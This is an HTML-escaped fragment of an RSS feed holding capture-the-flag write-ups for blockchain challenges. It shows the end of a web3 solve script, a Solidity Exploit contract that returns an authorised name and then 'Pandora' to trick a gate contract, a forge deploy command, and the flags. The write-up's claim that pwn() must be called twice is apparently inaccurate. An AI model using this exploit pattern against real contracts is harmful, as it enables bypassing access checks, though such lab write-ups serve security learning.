+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">transaction_receipt&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">w3&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">eth&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">wait_for_transaction_receipt&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">transaction_hash&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">print_status&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Trigger the third function to hit the third target&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">for&lt;/span> &lt;span class="n">_&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="nb">range&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="p">):&lt;/span> &lt;span class="c1"># Increase the number of times we call the third() function&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">transaction&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">target_contract&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">functions&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">third&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">build_transaction&lt;/span>&lt;span class="p">({&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s1">&amp;#39;from&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">my_account&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">address&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s1">&amp;#39;gas&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">3000000&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s1">&amp;#39;gasPrice&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">w3&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">to_wei&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;10&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;gwei&amp;#39;&lt;/span>&lt;span class="p">),&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s1">&amp;#39;nonce&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">w3&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">eth&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">get_transaction_count&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">my_account&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">address&lt;/span>&lt;span class="p">),&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">})&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">signed_transaction&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">my_account&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">signTransaction&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">transaction&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">transaction_hash&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">w3&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">eth&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">send_raw_transaction&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">signed_transaction&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">rawTransaction&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">transaction_receipt&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">w3&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">eth&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">wait_for_transaction_receipt&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">transaction_hash&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">print_status&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Check if the challenge is solved&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">is_solved&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">setup_contract&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">functions&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">isSolved&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">call&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;Challenge solved:&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">is_solved&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Run the script and get the flag.&lt;/p>
+&lt;img src="Solved2.png" alt="Solved" width="1000"/>
+&lt;p>Flag is: &lt;strong>HTB{f33l5_n1c3_h1771n6_y0ur_74r6375}&lt;/strong>&lt;/p>
+&lt;p>&lt;strong>Fun fact: The script used to solve this challenge was generated by ChatGPT.&lt;/strong>&lt;/p>
+&lt;h2 id="the-art-of-deception">The Art Of Deception&lt;/h2>
+&lt;ul>
+&lt;li>
+&lt;p>&lt;strong>Given zip:&lt;/strong> &lt;a href="https://drive.google.com/drive/folders/1372QkXFtk-wwnEQRMxV2wkysXJtazzcn?usp=share_link" target="_blank" rel="noopener">Get it here!&lt;/a>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Description:&lt;/strong> Your cyborg abilities are not always the most effective tools for achieving your goals. Sometimes, you need to go unnoticed and blend in with your surroundings. To achieve this, you must learn to assume new identities and blend in with different groups of people. Mastering the art of deception requires subtlety, observation, and the ability to read people&amp;rsquo;s motivations and intentions. After completing this training, you will emerge as a skilled infiltrator, capable of seamlessly blending in with your surroundings and achieving your objectives with stealth and subtlety. Can you bypass the High Security Gate and sneak into the Fortified Perimeter?&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Note:&lt;/strong> This challenge had a docker but it might be closed at the time you are reading this. All needed files will be given in the write-ups.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Category:&lt;/strong> Blockchain&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Difficulty:&lt;/strong> Easy&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;p>In this challenge, the objective is to trick the &lt;code>HighSecurityGate&lt;/code> contract, making its lastEntrant equal to &lt;code>Pandora&lt;/code>. The &lt;code>Setup&lt;/code> contract imports and initializes the &lt;code>HighSecurityGate&lt;/code> contract. The &lt;code>isSolved()&lt;/code> function checks if the lastEntrant variable in the &lt;code>HighSecurityGate&lt;/code> contract is equal to &lt;code>Pandora&lt;/code>.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-solidity" data-lang="solidity">&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">function&lt;/span> &lt;span class="nf">isSolved&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="k">public&lt;/span> &lt;span class="k">view&lt;/span> &lt;span class="k">returns&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">bool&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">TARGET&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">strcmp&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">TARGET&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">lastEntrant&lt;/span>&lt;span class="p">(),&lt;/span> &lt;span class="s">&amp;#34;Pandora&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>The &lt;code>HighSecurityGate&lt;/code> contract has an array of authorized names (Orion, Nova, and Eclipse), and the &lt;code>enter()&lt;/code> function checks if the name returned by the Entrant interface implementation matches any of the authorized names. If it does, the lastEntrant variable is updated with the returned name.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-solidity" data-lang="solidity">&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">string&lt;/span>&lt;span class="p">[]&lt;/span> &lt;span class="k">private&lt;/span> &lt;span class="n">authorized&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="s">&amp;#34;Orion&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;Nova&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;Eclipse&amp;#34;&lt;/span>&lt;span class="p">];&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">string&lt;/span> &lt;span class="k">public&lt;/span> &lt;span class="n">lastEntrant&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">function&lt;/span> &lt;span class="nf">enter&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="k">external&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">Entrant&lt;/span> &lt;span class="n">_entrant&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">Entrant&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">msg&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nb">sender&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">require&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">_isAuthorized&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">_entrant&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nb">name&lt;/span>&lt;span class="p">()),&lt;/span> &lt;span class="s">&amp;#34;Intruder detected&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">lastEntrant&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">_entrant&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nb">name&lt;/span>&lt;span class="p">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">function&lt;/span> &lt;span class="nf">_isAuthorized&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">string&lt;/span> &lt;span class="k">memory&lt;/span> &lt;span class="n">_user&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="k">private&lt;/span> &lt;span class="k">view&lt;/span> &lt;span class="k">returns&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">bool&lt;/span>&lt;span class="p">){&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">uint&lt;/span> &lt;span class="n">i&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="n">authorized&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">length&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">i&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="p">){&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">strcmp&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">_user&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">authorized&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">])){&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="kc">true&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="kc">false&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>To exploit this setup, an &lt;code>Exploit&lt;/code> contract is created, implementing the Entrant interface with a &lt;code>name()&lt;/code> function that returns an authorized name on the first call and &lt;code>Pandora&lt;/code> on the second call. This contract also has a &lt;code>pwn()&lt;/code> function that calls the &lt;code>enter()&lt;/code> function of the &lt;code>HighSecurityGate&lt;/code> contract, with the Exploit contract acting as the sender. This is the &lt;code>Exploit&lt;/code> contract:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-solidity" data-lang="solidity">&lt;span class="line">&lt;span class="cl">&lt;span class="k">pragma solidity&lt;/span> &lt;span class="o">^&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">18&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="s">&amp;#34;./Setup.sol&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kd">interface&lt;/span> &lt;span class="nc">Entrant&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">function&lt;/span> &lt;span class="nf">name&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="k">external&lt;/span> &lt;span class="k">returns&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">string&lt;/span> &lt;span class="k">memory&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kd">contract&lt;/span> &lt;span class="nc">Exploit&lt;/span> &lt;span class="k">is&lt;/span> &lt;span class="n">Entrant&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">address&lt;/span> &lt;span class="k">payable&lt;/span> &lt;span class="k">public&lt;/span> &lt;span class="n">targetAddr&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">Setup&lt;/span> &lt;span class="n">targetContract&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">bool&lt;/span> &lt;span class="k">public&lt;/span> &lt;span class="n">first&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">constructor&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">address&lt;/span> &lt;span class="k">payable&lt;/span> &lt;span class="n">_addr&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="k">payable&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">targetAddr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">payable&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">_addr&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">targetContract&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">Setup&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">targetAddr&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">first&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="kc">true&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">function&lt;/span> &lt;span class="nf">name&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="k">external&lt;/span> &lt;span class="k">returns&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">string&lt;/span> &lt;span class="k">memory&lt;/span>&lt;span class="p">){&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">first&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">first&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="kc">false&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="s">&amp;#34;Orion&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span> &lt;span class="k">else&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="s">&amp;#34;Pandora&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">function&lt;/span> &lt;span class="nf">pwn&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="k">public&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">targetContract&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">TARGET&lt;/span>&lt;span class="p">().&lt;/span>&lt;span class="n">enter&lt;/span>&lt;span class="p">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>To deploy the &lt;code>Exploit&lt;/code> contract, we used &lt;code>foundry-rs&lt;/code> (you can find it here: &lt;a href="https://github.com/foundry-rs/foundry" target="_blank" rel="noopener">https://github.com/foundry-rs/foundry&lt;/a>) :&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">forge create Exploit --rpc-url &amp;lt;rpc_url&amp;gt; --private-key &amp;lt;private_key&amp;gt; --constructor-args &amp;lt;setup_contract_address&amp;gt; --value 100ether
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>After deploying the &lt;code>Exploit&lt;/code> contract, call the &lt;code>pwn()&lt;/code> function twice. On the first call, the &lt;code>name()&lt;/code> function will return an authorized name, updating the &lt;code>lastEntrant&lt;/code> variable in the &lt;code>HighSecurityGate&lt;/code> contract. On the second call, the &lt;code>name()&lt;/code> function will return &lt;code>Pandora&lt;/code>, updating the &lt;code>lastEntrant&lt;/code> variable to the desired value.
+When the &lt;code>lastEntrant&lt;/code> variable set to &lt;code>Pandora&lt;/code>, the &lt;code>isSolved()&lt;/code> function in the &lt;code>Setup&lt;/code> contract will return &lt;code>true&lt;/code>, indicating that the challenge has been successfully solved.&lt;/p>
+&lt;p>Flag is: &lt;strong>HTB{H1D1n9_1n_PL41n_519H7}&lt;/strong>&lt;/p></description></item></channel></rss>
